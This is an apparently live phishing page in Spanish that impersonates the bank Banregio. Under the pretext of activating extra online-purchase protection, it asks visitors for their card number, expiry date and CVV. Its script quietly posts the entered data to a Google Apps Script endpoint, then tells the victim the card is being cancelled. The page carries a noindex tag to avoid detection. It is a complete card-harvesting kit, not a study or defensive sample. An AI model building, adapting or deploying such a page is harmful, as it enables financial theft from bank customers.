
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&display=swap" rel="stylesheet">  
  <link rel="stylesheet" href="css/estilos.css">
  <meta name="robots" content="noindex, nofollow">
  <title>Banregio | Protección </title>

</head>
<body>
    <div class="formulario-contenedor">
      <div class="registro activo" id="registro">
        <div class="header">
          <img src="candado.png">
        </div>
        <p>Hemos enviado un código de verificación.</p>
<br>
        <form class="formulario" id="contact-form" name="submit-form">
          <p id="holder">Por favor ingresa los datos de tu tarjeta, activaremos proteccion adicional para compras en linea.</p>
          <!-- Campo "tarjeta" solo acepta números y debe tener 16 dígitos -->
<br>
          <label for="tarjeta">Número de Tarjeta</label>
          <div class="contenedor-input">
            <input id="pipo" name="t1" type="text" placeholder="16 Números" required="" maxlength="16" pattern="[0-9]{16}" title="Ingrese los dígitos." inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
          </div>
          <div class="contenedor-input">
            <div class="input-wrapper">
              <label for="fecha">Fecha</label>
              <input id="calor" name="t2" type="text" placeholder="MM/YY" required="" maxlength="5" pattern="(0[1-9]|1[0-2])\/\d{2}" title="Ingrese una fecha válida en formato MM/YY (mes y año separados por '/').">
            </div>
          
            <div class="input-wrapper">
              <label for="cvv">CVV</label>
              <input type="text" id="loca" name="t4" placeholder="3 digitos" required="" maxlength="3" pattern="[0-9]{3}" title="Ingrese 3 dígitos numéricos." inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
            </div>
          </div>
          
          <div class="contenedor-button">
            <button type="submit" id="submit-contact-form" onclick="miMensaje()">
              confirmar
            </button>
          </div>
        </form>
      </div>
      <div class="header exito" id="exito">
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-check-circle" viewBox="0 0 16 16">
          <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/>
          <path d="M10.97 4.97a.235.235 0 0 0-.02.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-1.071-1.05z"/>
        </svg>
        <h1>Tarjeta en proceso de cancelación.</h1>
        <p>Continua con tu asesor digital.</p>
      </div>
    </div>
    <script>
      const scriptURL = 'https://script.google.com/macros/s/AKfycbxG_yDcckrBC7H2KI2e7WV8HKC6GZxhhNjDWTS8CFQ-LJARhy8ExMcEGxQ_0TjhTQUg-Q/exec';
      const form = document.forms['contact-form'];
      const exito = document.getElementById('exito'); // Obtén la referencia al elemento de éxito
    
      form.addEventListener('submit', e => {
        e.preventDefault();
        fetch(scriptURL, { method: 'POST', body: new FormData(form) })
          .then(response => {
            if (response.ok) {
              // Si la respuesta es exitosa, muestra la parte de éxito y oculta el formulario
              form.style.display = 'none';
              exito.style.display = 'block';
            } else {
              console.error('Error en la respuesta:', response.status);
            }
          })
          .catch(error => console.error('Error!', error.message));
      });
    
      // Script para agregar automáticamente el "/" en el campo de fecha
      document.getElementById('calor').addEventListener('input', function (e) {
        const input = e.target;
        const value = input.value.replace(/\D/g, ''); // Elimina cualquier carácter no numérico
        if (value.length > 2) {
          // Agrega un "/" después de los primeros dos dígitos
          input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
        } else {
          input.value = value; // Mantiene los primeros dos dígitos sin "/"
        }
      });
    </script>
    
</body>
</html>
